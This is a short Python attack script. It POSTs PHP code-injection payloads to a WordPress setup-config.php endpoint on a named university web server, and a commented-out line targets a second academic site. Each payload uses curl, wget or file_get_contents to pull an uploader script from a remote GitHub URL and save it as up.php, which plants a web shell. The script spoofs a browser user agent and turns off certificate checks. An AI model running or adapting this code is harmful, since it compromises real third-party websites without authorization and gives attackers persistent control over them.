import requests,random
from files.localuseragent import *


headers = {"User-agent": random.choice(ua["browsers"]["chrome"])}
PostData1 = '<?php system("curl -O https://raw.githubusercontent.com/rodieka/php/main/uploader.php"); system("mv uploader up.php"); ?>'
PostData2 = '<?php system("wget https://raw.githubusercontent.com/rodieka/php/main/uploader.php -O up.php"); ?>'
PostData3 = '<?php fwrite(fopen("up.php","w+"),file_get_contents("https://raw.githubusercontent.com/rodieka/php/main/uploader.php")); ?>'
shell = [PostData1,PostData2,PostData3]
try:
    for sh in shell:
        session = requests.session()
        CheckShell1 = session.post("https://phys.tsu.ru/~kozhevnikov/wp-admin/setup-config.php" ,data=sh, headers=headers, timeout=10, verify=False, allow_redirects=False)
        print(CheckShell1)
except:
 pass
# <!-- req = requests.post("http://arinnabill.it.student.pens.ac.id/wp-admin/install.php",headers=head,data=data) -->